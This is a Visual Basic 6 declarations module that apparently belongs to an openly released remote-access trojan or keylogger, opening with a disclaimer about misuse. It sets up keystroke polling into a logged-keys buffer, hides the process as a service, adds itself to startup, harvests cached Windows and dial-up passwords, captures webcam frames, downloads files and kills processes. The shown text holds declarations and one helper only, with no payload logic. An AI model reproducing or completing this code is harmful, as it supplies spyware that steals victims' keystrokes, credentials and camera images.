Attribute VB_Name = "mod4"
Option Explicit
'Warning : This Program Control and its required files are Open Source to the world thus the Author is not responsible For Any Misuse.
Public Const VK_BACK                          As Long = &H8
Public Const VK_CONTROL                       As Long = &H11
''Private Const VK_Shift1                       As Long = &H10
Public Const VK_TAB                           As Long = &H9
Public Const VK_RETURN                        As Long = &HD
Public Const VK_MENU                          As Long = &H12
Public Const VK_ESCAPE                        As Long = &H1B
Public Const VK_CAPITAL                       As Long = &H14
Public Const VK_SPACE                         As Long = &H20
Public Const VK_SNAPSHOT                      As Long = &H2C
Public Const VK_UP                            As Long = &H26
Public Const VK_DOWN                          As Long = &H28
Public Const VK_LEFT                          As Long = &H25
Public Const VK_RIGHT                         As Long = &H27
''Private Const VK_MBUTTON                      As Long = &H4
''Private Const VK_RBUTTON                      As Long = &H2
''Private Const VK_LBUTTON                      As Long = &H1
Public Const VK_PERIOD                        As Long = &HBE
Public Const VK_COMMA                         As Long = &HBC
'Num lock Numbers
Public Const VK_NUMLOCK                       As Long = &H90
Public Const VK_NUMPAD0                       As Long = &H60
Public Const VK_NUMPAD1                       As Long = &H61
Public Const VK_NUMPAD2                       As Long = &H62
Public Const VK_NUMPAD3                       As Long = &H63
Public Const VK_NUMPAD4                       As Long = &H64
Public Const VK_NUMPAD5                       As Long = &H65
Public Const VK_NUMPAD6                       As Long = &H66
Public Const VK_NUMPAD7                       As Long = &H67
Public Const VK_NUMPAD8                       As Long = &H68
Public Const VK_NUMPAD9                       As Long = &H69
'F Keys
Public Const VK_F9                            As Long = &H78
Public Const VK_F8                            As Long = &H77
Public Const VK_F7                            As Long = &H76
Public Const VK_F6                            As Long = &H75
Public Const VK_F5                            As Long = &H74
Public Const VK_F4                            As Long = &H73
Public Const VK_F3                            As Long = &H72
Public Const VK_F2                            As Long = &H71
Public Const VK_F12                           As Long = &H7B
Public Const VK_F11                           As Long = &H7A
Public Const VK_F10                           As Long = &H79
Public Const VK_F1                            As Long = &H70
Public Shift1                                 As Boolean
Public T                                      As Long
'Dim Senddatas As Boolean ':( Missing Scope
'--------------------------------------------------------------------------------------
'Connections --------------------------------------------------------------------------
Public Const ERROR_SUCCESS                    As Long = 0
Private Const RAS95_MaxEntryName              As Long = 256
Private Const RAS_MaxPhoneNumber              As Long = 128
Private Const RAS_MaxCallbackNumber           As Long = RAS_MaxPhoneNumber
Private Const UNLEN                           As Long = 256
Private Const PWLEN                           As Long = 256
Private Const DNLEN                           As Long = 12
Private Const RAS_MAXDEVICETYPE               As Long = 16
Private Const RAS_MAXDEVICENAME               As Long = 128
Private Const RAS_MAXENTRYNAME                As Long = 256
Public Type RASDIALPARAMS
    dwSize                                      As Long
    szEntryName(RAS95_MaxEntryName)             As Byte
    szPhoneNumber(RAS_MaxPhoneNumber)           As Byte
    szCallbackNumber(RAS_MaxCallbackNumber)     As Byte
    szUserName(UNLEN)                           As Byte
    szPassword(PWLEN)                           As Byte
    szDomain(DNLEN)                             As Byte
End Type
Public Type RASENTRYNAME95
    dwSize                                      As Long
    szEntryName(RAS95_MaxEntryName)             As Byte
End Type
Public Type RasEntryName
    dwSize                                      As Long
    szEntryName(RAS_MAXENTRYNAME)               As Byte
End Type
Public Type RasConn
    dwSize                                      As Long
    hRasConn                                    As Long
    szEntryName(RAS_MAXENTRYNAME)               As Byte
    szDeviceType(RAS_MAXDEVICETYPE)             As Byte
    szDeviceName(RAS_MAXDEVICENAME)             As Byte
End Type
'--------------------------------------------------------------------------------------
'ActiveWindow -------------------------------------------------------------------------
Public nCAPTION                               As String
Public nTESTER                                As Long
Public nClass                                 As String
Public inData                                 As String
'--------------------------------------------------------------------------------------
' Functions ---------------------------------------------------------------------------
Public Const AddtoStartup_SZ                  As Long = 1
Public Const RSP_SIMPLE_SERVICE               As Long = 1
Public Const REALTIME_PRIORITY_CLASS          As Long = &H100
'<:-) :SUGGESTION: Scope should be changed to Private
Private Const MAX_PATH                        As Long = 260
Private Const TH32CS_SNAPHEAPLIST             As Long = &H1
Private Const TH32CS_SNAPPROCESS              As Long = &H2
Private Const TH32CS_SNAPTHREAD               As Long = &H4
Private Const TH32CS_SNAPMODULE               As Long = &H8
Public Const TH32CS_SNAPALL                   As Double = (TH32CS_SNAPHEAPLIST + TH32CS_SNAPPROCESS + TH32CS_SNAPTHREAD + TH32CS_SNAPMODULE)
Public Type PROCESSENTRY32
    dwSize                                      As Long
    cntUsage                                    As Long
    th32ProcessID                               As Long
    th32DefaultHeapID                           As Long
    th32ModuleID                                As Long
    cntThreads                                  As Long
    th32ParentProcessID                         As Long
    pcPriClassBase                              As Long
    dwFlags                                     As Long
    szexeFile                                   As String * MAX_PATH
End Type
Public Const DOT                              As String = "."
Public Const EXT_ALL                          As String = "*.*"
Public Const FILE_ATTRIBUTE_DIRECTORY         As Long = &H10
Public Const INVALID_HANDLE_VALUE             As Long = (-1)
Public Type FILETIME
    dwLowDateTime                               As Long
    dwHighDateTime                              As Long
End Type
Public Type WIN32_FIND_DATA
    dwFileAttributes                            As Long
    ftCreationTime                              As FILETIME
    ftLastAccessTime                            As FILETIME
    ftLastWriteTime                             As FILETIME
    nFileSizeHigh                               As Long
    nFileSizeLow                                As Long
    dwReserved0                                 As Long
    dwReserved1                                 As Long
    cFileName                                   As String * MAX_PATH
    cAlternate                                  As String * 14
End Type
'--------------------------------------------------------------------------------------
'Commands -----------------------------------------------------------------------------
Public AppPath                                As String
Public LocalhttpAddress                           As String
Public LoggedKeys                             As String
Public port                                   As Long
Public LogEnabled                             As Boolean
'Dim PV As Long ':( Missing Scope
'--------------------------------------------------------------------------------------
'Log ----------------------------------------------------------------------------------
Public Connin                                 As Boolean
Public DataIN                                 As Boolean
Public Timein                                 As Boolean
Public SendingReport                          As Boolean
'--------------------------------------------------------------------------------------
'Sock ---------------------------------------------------------------------------------

'--------------------------------------------------------------------------------------
'------------------------------------Camera--------------------------------------------
Public Const Cam_CONNECT                      As Long = 1034
Public Const Cam_DISCONNECT                   As Long = 1035
Public Const Cam_GET_FRAME                    As Long = 1084
Public Const Cam_COPY                         As Long = 1054
'--------------------------------------------------------------------------------------
Public COLOR1                                 As String
Public NoForm                                 As Boolean
Public PW                                     As String
Public Type PASSWORD_CACHE_ENTRY
    cbEntry                                     As Integer
':( Type Suffix replaced
    cbResource                                  As Integer
':( Type Suffix replaced
    cbPassword                                  As Integer
':( Type Suffix replaced
    iEntry                                      As Byte
    nType                                       As Byte
    abResource(1 To 1024)                       As Byte
End Type
Public LastTitle                              As String
Public LastClass                              As String
Private Const SOL_SOCKET                      As Long = &HFFFF
Public Const SO_LINGER                        As Long = &H80
Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Public Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Public Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, ByVal pSrc As String, ByVal ByteLen As Long)
Public Declare Sub ZeroMemory Lib "kernel32.dll" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As Long)
Public Declare Function RasEnumEntries Lib "rasapi32.dll" Alias "RasEnumEntriesA" (ByVal Reserved As String, ByVal lpszPhonebook As String, lprasentryname As Any, lpcb As Long, lpcEntries As Long) As Long
Public Declare Function RasGetEntryDialParams Lib "rasapi32.dll" Alias "RasGetEntryDialParamsA" (ByVal lpcstr As String, ByRef lprasdialparamsa As RASDIALPARAMS, ByRef lpbool As Long) As Long
Public Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
Public Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal B As Byte, ByVal Get_Kill_Processes As Long, ByVal l As Long) As Long
Public Declare Function GetWindowText Lib "User32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetForegroundWindow Lib "User32" () As Long
Public Declare Function GetClassName Lib "User32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Public Declare Function Getasynckeystate Lib "User32" Alias "GetAsyncKeyState" (ByVal VKEY As Long) As Integer
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal ProcessID As Long, ByVal ServiceFlags As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function GetSystemDirectoryA Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Public Declare Function GetCurrentProcess Lib "kernel32" () As Long
'<:-) :SUGGESTION: Scope should be changed to Private
Public Declare Function SetPriorityClass Lib "kernel32" (ByVal hProcess As Long, ByVal dwPriorityClass As Long) As Long
'<:-) :SUGGESTION: Scope should be changed to Private
Public Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function CreateToolhelp32Snapshot Lib "kernel32" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Public Declare Function Process32First Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
Public Declare Function Process32Next Lib "kernel32" (ByVal hSnapshot As Long, lppe As Any) As Long
Public Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function SendMessage Lib "User32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindData As WIN32_FIND_DATA) As Long
Public Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindData As WIN32_FIND_DATA) As Long
Public Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function PostMessage Lib "User32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal cb As Long)       ':( Type Suffix replaced
Public Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Any) As Long
Public Declare Function capCreateCaptureWindow Lib "avicap32.dll" Alias "capCreateCaptureWindowA" (ByVal lpszWindowName As String, ByVal dwStyle As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal nID As Long) As Long
Public Declare Function BMPToJPG Lib "jcon.dll" (ByVal InputFilename As String, ByVal OutputFilename As String, ByVal Quality As Long) As Integer
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Public Function tempPath() As String
Dim sTmp As String
    sTmp = String$(145, vbNullChar)
    GetTempPath 145, sTmp
    tempPath = Left$(sTmp, InStr(sTmp, vbNullChar) - 1)
    tempPath = IIf(Right$(tempPath, 1) = "\", tempPath, tempPath & "\")
End Function
':)Code Fixer V3.0.9 (11/15/2006 12:12:16 PM) 330 + 14 = 344 Lines Thanks Ulli for inspiration and lots of code.
